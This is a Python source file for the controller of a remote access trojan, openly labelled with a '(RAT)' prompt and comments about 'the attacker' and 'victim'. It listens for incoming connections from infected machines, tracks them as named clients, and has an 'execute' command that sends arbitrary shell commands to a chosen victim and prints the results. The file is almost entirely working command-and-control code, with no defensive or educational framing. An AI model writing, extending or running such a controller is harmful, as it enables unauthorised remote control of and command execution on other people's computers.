import socket
from cmd2 import Cmd
import threading
import sys

if len(sys.argv) != 3:  # Parsing line arguments to get bind ip and bind port
    print(f"Usage: {sys.argv[0]} BIND_IP BIND_PORT")
    sys.exit()

BIND_IP = sys.argv[1]

try:
    BIND_PORT = int(sys.argv[2])
except ValueError:
    print("Invalid port")
    sys.exit()

COMMAND_IDENTIFIER = "CMD:"  # Useful to avoid problems with command execution. Just execute what the attacker wants


class ClientSession:
    def __init__(self, client_socket, alias):
        self.client_socket = client_socket
        self.alias = alias

    def send_data(self, data):
        if type(data) == str:
            data = data.encode()
        self.client_socket.send(data)

    def recv_data(self):
        data = self.client_socket.recv(1024)
        return data


class RATController(Cmd):

    def __init__(self):
        super().__init__()

        self.creation_count = 0  # Useful for creating new usernames

        self.prompt = "(RAT) "  # Setting cmd prompt

        self.BIND_IP = BIND_IP
        self.BIND_PORT = BIND_PORT

        self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Listener socket

        try:
            self.listener_socket.bind((self.BIND_IP, self.BIND_PORT))
        except OSError:
            print(f"Can't bind to {self.BIND_IP}, {self.BIND_PORT}")
            sys.exit(0)

        listener_thread = threading.Thread(target=self.listener_loop, name="Listener_Thread", daemon=True)
        self.run_thread(listener_thread)

    # Workflow

    running_threads = list()  # Here all running threads will be stored

    def listener_loop(self):  # Function to listen all connections
        self.listener_socket.listen(1)

        print(f"Listening on {self.BIND_IP} {self.BIND_PORT}")

        while True:
            conn, addr = self.listener_socket.accept()  # Waiting for a client connection
            print(f"Received a new connection from {addr}")

            new_client_thread = threading.Thread(target=self.handle_new_client, args=(conn, addr),
                                                 name="Client_Handle", daemon=True)
            self.run_thread(new_client_thread)  # Running the client connection in a new thread

    def handle_new_client(self, connection_socket, connection_addr):
        username = f"Newbie_{self.creation_count}"
        self.add_client(connection_socket, username)
        self.creation_count += 1

        print(f"Added {username} successfully")

        """while True:
            connection_socket.send("Hey i am a hacker, i got you".encode())
            time.sleep(2)
        connection_socket.close()"""
        pass

    def run_thread(self, thread):
        self.running_threads.append(thread)
        thread.start()

    # Rat properties

    connected_clients = dict()  # Here all active clients will be stored with their name as key value to identify them

    # Rat functions

    def add_client(self, client_socket, alias):
        new_client = ClientSession(client_socket, alias)
        self.connected_clients.update({new_client.alias: new_client})

    def send_client_data(self, client_name, data):
        try:
            target_client = self.connected_clients[client_name]
        except KeyError:
            print(f"Can't find client {client_name}")
            return

        try:
            if type(data) == str:  # Avoid problems with bytes encoding
                data = data.encode()
            target_client.send_data(data)  # Sending the data through the socket
            return True
        except BrokenPipeError:
            print(f"Can't connect with client {client_name}")
            try:
                del self.connected_clients[client_name]
            except KeyError:
                pass
            return False

    # Cmd commands

    def do_execute(self, s):
        """Function to execute a single command in a target victim"""
        args = s.split(" ")

        if len(args) < 2:
            print("Usage: execute victim command")
            return

        target_client = args[0]

        if target_client not in self.connected_clients:
            print(f"{target_client} not found")
            return

        final_command = COMMAND_IDENTIFIER + " ".join(args[1:]).strip('"')  # Sanitize command

        if self.send_client_data(target_client, final_command):  # If the command is sent successfully...
            command_output = self.connected_clients[target_client].recv_data().decode()
        else:  # Can't send the command
            print(f"Can't send data to client '{target_client}'")
            print("Closing connection")
            try:
                del self.connected_clients[target_client]
            except KeyError:
                pass
            return

        print(command_output)  # Printing command output

    def complete_execute(self, text, line, begidx, endidx):  # Function to allow 'execute' auto-completion
        completions = [x for x in self.connected_clients]

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in completions if s.startswith(mline)]

    def do_list(self, s):
        """Function to list program items such as clients"""
        args = s.split()
        if not args: return

        list_object = args[0]  # What the user want to be listed

        if list_object == "clients":
            for client in self.connected_clients.values():
                print(client.alias)

        if list_object == "processes":
            for thread in self.running_threads:
                print(thread.name)

    def complete_list(self, text, line, begidx, endidx):  # Function to allow 'list' auto-completion
        completions = [
            "clients",
            "processes"
        ]

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in completions if s.startswith(mline)]


controller = RATController()
controller.cmdloop()
